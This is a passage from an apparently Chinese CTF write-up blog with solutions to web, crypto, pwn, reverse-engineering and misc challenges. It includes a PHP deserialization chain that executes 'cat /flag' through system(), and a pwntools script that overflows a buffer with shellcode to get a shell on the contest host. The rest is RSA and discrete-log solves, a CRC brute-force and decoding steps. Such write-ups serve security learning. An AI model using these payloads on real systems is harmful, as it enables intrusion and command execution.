class="hljs-variable">$do</span>[<span class="hljs-number">0</span>]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;==================PLZ Input Your Name!==================&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable">$b</span>==<span class="hljs-string">&quot;&#x27;k1fuhu&#x27;s test demo&quot;</span>)<br>    &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;登录成功&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>思路很清晰</p><p>直接构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> wo;<br><span class="hljs-variable">$c</span>-&gt;sex = <span class="hljs-string">&quot;boy&quot;</span>;<br><span class="hljs-variable">$c</span>-&gt;age = <span class="hljs-string">&quot;eighteen&quot;</span>;<br><span class="hljs-variable">$Shit</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">shi</span>();<br><span class="hljs-variable">$damn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>;<br><span class="hljs-variable">$damn</span>-&gt;<span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$damn</span>-&gt;<span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$Shit</span>-&gt;next = <span class="hljs-variable">$damn</span>;<br><span class="hljs-variable">$Shit</span>-&gt;pass = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br><span class="hljs-variable">$c</span>-&gt;intention = <span class="hljs-variable">$Shit</span>;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">O<span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;wo&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sex&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;boy&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;age&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;eighteen&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">9</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;intention&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;shi&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;next&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Demo&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span>;N;s<span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;pass&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">9</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;cat /flag&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240301191546616.png" alt="image-20240301191546616"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="解个方程"><a href="#解个方程" class="headerlink" title="解个方程"></a>解个方程</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">欢迎来到青少年CTF，领取你的题目，进行解答吧！这是一道数学题！！<br>    p = 70559223834693127821574754764487916409<br>    q = 291568698992769291833060922537869705687<br>    e = 65537<br>    d = ?<br>    <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>p = <span class="hljs-number">70559223834693127821574754764487916409</span><br>q = <span class="hljs-number">291568698992769291833060922537869705687</span><br>e = <span class="hljs-number">65537</span><br> <br>s = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,s)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;dec: &quot;</span> + <span class="hljs-built_in">str</span>(d))<br></code></pre></td></tr></table></figure><h2 id="ez-log"><a href="#ez-log" class="headerlink" title="ez_log"></a>ez_log</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br>flag=<span class="hljs-string">b&#x27;key&#123;xxxxxxx&#125;&#x27;</span><br>m=bytes_to_long(flag)<br>p=<span class="hljs-number">3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037</span><br>g=<span class="hljs-number">3</span><br>c=<span class="hljs-built_in">pow</span>(g,m,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c=&#x27;</span>,c)<br><br>    c=<span class="hljs-number">1409970374102613813154760568158003123875011225002977256272054381228289122265018484564640527366469489471011960208090567829620353663244080501413923713114331075726206212331906003182378049316620</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 已知的参数</span><br>p = <span class="hljs-number">3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037</span><br>g = <span class="hljs-number">3</span><br>c = <span class="hljs-number">1409970374102613813154760568158003123875011225002977256272054381228289122265018484564640527366469489471011960208090567829620353663244080501413923713114331075726206212331906003182378049316620</span><br><br><span class="hljs-comment"># 计算离散对数</span><br>m = discrete_log(p, c, g)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;m =&quot;</span>, long_to_bytes(m))<br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240229201301587.png" alt="image-20240229201301587"></p><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><p>题干</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">b&#x27;qsnctf&#123;xxx-xxxx-xxxx-xxxx-xxxxxxxxx&#125;&#x27;</span><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>r = getPrime(<span class="hljs-number">512</span>)<br>n = p * q * r<br>leak = p * q<br>e = <span class="hljs-number">0x10001</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;leak = <span class="hljs-subst">&#123;leak&#125;</span>&#x27;</span>)<br><span class="hljs-comment"># c = 173595148273920891298949441727054328036798235134009407863895058729356993814829340513336567479145746034781201823694596731886346933549577879568197521436900228804336056005940048086898794965549472641334237175801757569154295743915744875800647234151498117718087319013271748204766997008772782882813572814296213516343420236873651060868227487925491016675461540894535563805130406391144077296854410932791530755245514034242725719196949258860635915202993968073392778882692892</span><br><span class="hljs-comment"># n = 1396260492498511956349135417172451037537784979103780135274615061278987700332528182553755818089525730969834188061440258058608031560916760566772742776224528590152873339613356858551518007022519033843622680128062108378429621960808412913676262141139805667510615660359775475558729686515755127570976326233255349428771437052206564497930971797497510539724340471032433502724390526210100979700467607197448780324427953582222885828678441579349835574787605145514115368144031247</span><br><span class="hljs-comment"># leak = 152254254502019783796170793516692965417859793325424454902983763285830332059600151137162944897787532369961875766745853731769162511788354655291037150251085942093411304833287510644995339391240164033052417935316876168953838783742499485868268986832640692657031861629721225482114382472324320636566226653243762620647</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>r=n//leak<br>d=inverse_mod(<span class="hljs-number">65537</span>,r-<span class="hljs-number">1</span>)<br>m=<span class="hljs-built_in">pow</span>(c,d,r)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="factor1"><a href="#factor1" class="headerlink" title="factor1"></a>factor1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>d = getPrime(<span class="hljs-number">256</span>)<br>e = gmpy2.invert(d, (p**<span class="hljs-number">2</span> - <span class="hljs-number">1</span>) * (q**<span class="hljs-number">2</span> - <span class="hljs-number">1</span>))<br>flag = <span class="hljs-string">&quot;qsnctf&#123;&quot;</span> + hashlib.md5(<span class="hljs-built_in">str</span>(p + q).encode()).hexdigest() + <span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(e)<br><span class="hljs-built_in">print</span>(p * q)<br><span class="hljs-comment"># 4602579741478096718172697218991734057017874575484294836043557658035277770732473025335441717904100009903832353915404911860888652406859201203199117870443451616457858224082143505393843596092945634675849883286107358454466242110831071552006337406116884147391687266536283395576632885877802269157970812862013700574069981471342712011889330292259696760297157958521276388120468220050600419562910879539594831789625596079773163447643235584124521162320450208920533174722239029506505492660271016917768383199286913178821124229554263149007237679675898370759082438533535303763664408320263258144488534391712835778283152436277295861859</span><br><span class="hljs-comment"># 78665180675705390001452176028555030916759695827388719494705803822699938653475348982551790040292552032924503104351703419136483078949363470430486531014134503794074329285351511023863461560882297331218446027873891885693166833003633460113924956936552466354566559741886902240131031116897293107970411780310764816053</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>A=matrix(ZZ,<span class="hljs-number">2</span>)<br>A[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]=<span class="hljs-number">2</span>**<span class="hljs-number">1024</span><br>A[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]=e<br>A[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]=n^<span class="hljs-number">2</span><br>res=A.LLL()<br><span class="hljs-built_in">print</span>(res[<span class="hljs-number">0</span>])<br>x=res[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br>d=x//(<span class="hljs-number">2</span>**<span class="hljs-number">1024</span>)<br>k=(e*d-<span class="hljs-number">1</span>)//(n^<span class="hljs-number">2</span>)+<span class="hljs-number">1</span><br>p2q2=<span class="hljs-number">1</span>+n^<span class="hljs-number">2</span>-(e*d-<span class="hljs-number">1</span>)//k<br>pq=isqrt(p2q2+<span class="hljs-number">2</span>*n)<br>flag = <span class="hljs-string">&quot;qsnctf&#123;&quot;</span> + hashlib.md5(<span class="hljs-built_in">str</span>(pq).encode()).hexdigest() + <span class="hljs-string">&quot;&#125;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="四重加密"><a href="#四重加密" class="headerlink" title="四重加密"></a>四重加密</h2><p><img src="/posts/14e77824/image-20240301190709763.png" alt="image-20240301190709763"></p><p>base32</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs base32">OFZW4Y3UMY======<br>qsnctf<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#121;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#123;</span><span class="hljs-symbol">&amp;#109;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#109;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#109;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#95;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#98;</span><span class="hljs-symbol">&amp;#104;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#95;</span><span class="hljs-symbol">&amp;#107;</span><span class="hljs-symbol">&amp;#119;</span><span class="hljs-symbol">&amp;#109;</span><span class="hljs-symbol">&amp;#113;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#125;</span><span class="hljs-symbol">&amp;#124;</span><span class="hljs-symbol">&amp;#107;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#121;</span><span class="hljs-symbol">&amp;#61;</span><span class="hljs-symbol">&amp;#104;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#111;</span><br></code></pre></td></tr></table></figure><p>html 实体解码</p><p><img src="/posts/14e77824/image-20240301190915127.png" alt="image-20240301190915127"></p><p>根据前四个字母 flag 判断</p><p><img src="/posts/14e77824/image-20240301191157026.png" alt="image-20240301191157026"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="简单的数学题"><a href="#简单的数学题" class="headerlink" title="简单的数学题"></a>简单的数学题</h2><p>nc上去算三道数学题就行</p><h2 id="Easy-Shellcode"><a href="#Easy-Shellcode" class="headerlink" title="Easy_Shellcode"></a>Easy_Shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;challenge.qsnctf.com&quot;</span>, <span class="hljs-number">31977</span>)<span class="hljs-comment">#process(&quot;./easy-shellcode&quot;)</span><br><br>buf_addr = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(buf_addr)<br>shellcode_addr = <span class="hljs-built_in">int</span>(buf_addr,<span class="hljs-number">16</span>) + <span class="hljs-number">32</span>  <br><br><br>shellcode = asm(shellcraft.sh())<br><br>payload = shellcode + <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x100</span> + <span class="hljs-number">0x8</span> - <span class="hljs-built_in">len</span>(shellcode)) + p64(<span class="hljs-built_in">int</span>(buf_addr,<span class="hljs-number">16</span>))<br><span class="hljs-comment">#p.recv()</span><br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="来打CS咯"><a href="#来打CS咯" class="headerlink" title="来打CS咯"></a>来打CS咯</h2><p>在线网站<a href="https://s.threatbook.com/">微步在线云沙箱 (threatbook.com)</a></p><p>分析网络行为即可</p><p><img src="/posts/14e77824/image-20240229202238639.png" alt="image-20240229202238639"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="CTFer-Revenge"><a href="#CTFer-Revenge" class="headerlink" title="CTFer Revenge"></a>CTFer Revenge</h2><p>题目太长贴个图片吧</p><p><img src="/posts/14e77824/image-20240229202503571.png" alt="image-20240229202503571"></p><p>经常使用 hex editor 的应该很熟悉</p><p>根据提示 <code>从反方向开始移动， 回到当初爱你的时空</code></p><p>从尾巴开始看</p><p><img src="/posts/14e77824/image-20240229202608307.png" alt="image-20240229202608307"></p><p>可以发现熟悉的PK文件头</p><p>可知为 zip文件</p><p>写脚本转置一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_string</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Reverse the given string.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> string[::-<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_lines</span>(<span class="hljs-params">input_file, output_file</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Read lines from input_file, remove first 9 characters, reverse each line, and write to output_file.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fin, <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> fout:<br>        lines = fin.readlines()<br><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(lines):<br>            <span class="hljs-comment"># Remove first 9 characters and reverse the line</span><br>            start_index = line.find(<span class="hljs-string">&quot;|&quot;</span>)<br>            end_index = line.rfind(<span class="hljs-string">&quot;|&quot;</span>)<br>            <span class="hljs-keyword">if</span> start_index != -<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> end_index != -<span class="hljs-number">1</span>:<br>                <span class="hljs-comment"># Remove content between &#x27;|&#x27; and reverse the line</span><br>                reversed_line = reverse_string(<br>                    line[:start_index] + line[end_index + <span class="hljs-number">1</span> :].strip()<br>                )<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># If &#x27;|&#x27; is not found or only one &#x27;|&#x27; is found, reverse the entire line</span><br>                reversed_line = reverse_string(line.strip())<br>            <span class="hljs-comment"># Write reversed line to output file</span><br>            fout.write(reversed_line[<span class="hljs-number">9</span>:] + <span class="hljs-string">&quot;\n&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    input_file = <span class="hljs-string">&quot;a.txt&quot;</span><br>    output_file = <span class="hljs-string">&quot;c.txt&quot;</span><br><br>    reverse_lines(input_file, output_file)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Lines reversed and written to&quot;</span>, output_file)<br><br></code></pre></td></tr></table></figure><p>调整下手动写入变成 zip 文件</p><p>有密码加密<img src="/posts/14e77824/image-20240229202937794.png" alt="image-20240229202937794"></p><p>根据提示</p><p>使用  APCHPR 爆破</p><p><img src="/posts/14e77824/image-20240229203131201.png" alt="image-20240229203131201"></p><h2 id="多情"><a href="#多情" class="headerlink" title="多情"></a>多情</h2><p>图片 foremost 出新图片</p><p>存在 crc 错误，找个脚本爆破，修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> struct<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./00000013.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> image_data:<br>    bin_data = image_data.read()<br>data = <span class="hljs-built_in">bytearray</span>(bin_data[<span class="hljs-number">12</span>:<span class="hljs-number">29</span>])<br>crc32key = <span class="hljs-number">0x51F95FB8</span><br><span class="hljs-comment"># 理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span><br>n = <span class="hljs-number">4096</span><br><span class="hljs-comment"># 高和宽一起爆破</span><br><span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    <span class="hljs-comment"># q为8字节，i为4字节，h为2字节</span><br>    width = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&quot;&gt;i&quot;</span>, w))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        height = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&quot;&gt;i&quot;</span>, h))<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            data[x + <span class="hljs-number">4</span>] = width[x]<br>            data[x + <span class="hljs-number">8</span>] = height[x]<br>        crc32result = zlib.crc32(data)<br>        <span class="hljs-keyword">if</span> crc32result == crc32key:<br>            <span class="hljs-built_in">print</span>(<br>                <span class="hljs-string">&quot;width:%s  height:%s&quot;</span><br>                % (<span class="hljs-built_in">bytearray</span>(width).<span class="hljs-built_in">hex</span>(), <span class="hljs-built_in">bytearray</span>(height).<span class="hljs-built_in">hex</span>())<br>            )<br>            exit()<br><br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/00000013.png" alt="00000013"></p><p>得到提示</p><p>根据zip 0 1 猜测 二进制</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs txt">1111100100 // 996<br><br>第二个零bn<br><br>第二个一p5<br><br>第六个一f6H<br><br>第三个零QS<br><br>第三个一mJ<br><br>第四个零Nh<br><br>第四个一cd<br><br>第五个一Eb<br><br>第一个零bv2<br><br>第一个一Lr<br><br>Lrp5mJcdEbbv2bnf6HQSNh<br></code></pre></td></tr></table></figure><p>出了半天，但是没想到这就是flag了</p><h2 id="小光的答案之书"><a href="#小光的答案之书" class="headerlink" title="小光的答案之书"></a>小光的答案之书</h2><p>首先</p><p><img src="/posts/14e77824/ccd8ad81c543efb97893c4d10d8cca34_720.png"></p><p>后来搜索到</p><p><img src="/posts/14e77824/image-20240301185136327.png" alt="image-20240301185136327"></p><p>得到密码为：<code>life</code></p><p><img src="/posts/14e77824/40dd801b5622186fdbb2f42d32cbf770.png" alt="40dd801b5622186fdbb2f42d32cbf770"></p><p>关注即可</p><h2 id="ez-model"><a href="#ez-model" class="headerlink" title="ez_model"></a>ez_model</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 